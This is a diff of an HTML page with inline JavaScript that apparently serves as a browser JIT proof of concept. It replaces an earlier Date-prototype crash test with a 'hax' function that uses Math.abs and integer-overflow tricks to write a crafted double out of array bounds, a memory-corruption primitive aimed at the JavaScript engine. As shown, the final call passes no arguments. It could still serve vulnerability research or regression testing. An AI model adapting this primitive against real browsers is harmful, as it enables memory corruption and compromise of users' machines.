@@ -1,30 +1,21 @@
 <script>
-let print = alert;
-
-	//@ runDefault("--dumpFTLDisassembly=1", "--thresholdForOptimizeSoon=10", "--useConcurrentJIT=0", "--useConcurrentGC=0", "--thresholdForJITAfterWarmUp=10", "--thresholdForOptimizeAfterWarmUp=100", "--thresholdForFTLOptimizeAfterWarmUp=1000")
- function main() {
-
-let oob = new Date(1);
-    v1(oob);
-
-  function v1(v2) {
-   try {
-       let v3 = v2.__proto__;
-   v2.e = 0x12341234;
-    for (let v9 = 0; v9 < 10; v9++) {         v1(v3);
-         }
-         for (let v20 = 0; v20 < 6; v20++) {
-                const v21 = v2.__proto__;
-               const v24 = {a:13.37};
-              const v26 = [v24];
-         }
-        } catch(v29) {
-    alert(v29)
-
-}
+function hax(arr, n) {
+    n |= 0;
+    if (n < 0) {
+        let v = (-n)|0;
+        let i = Math.abs(n);
+        if (i < arr.length) {
+            if (i & 0x80000000) {
+                i += -0x7ffffff9;
+            }
+            if (i > 0) {
+                arr[i] = 1.04380972981885e-310;
+            }
+        }
     }
-}
-main();
+} 
+alert("hey");
+hax();
 
     
 </script>
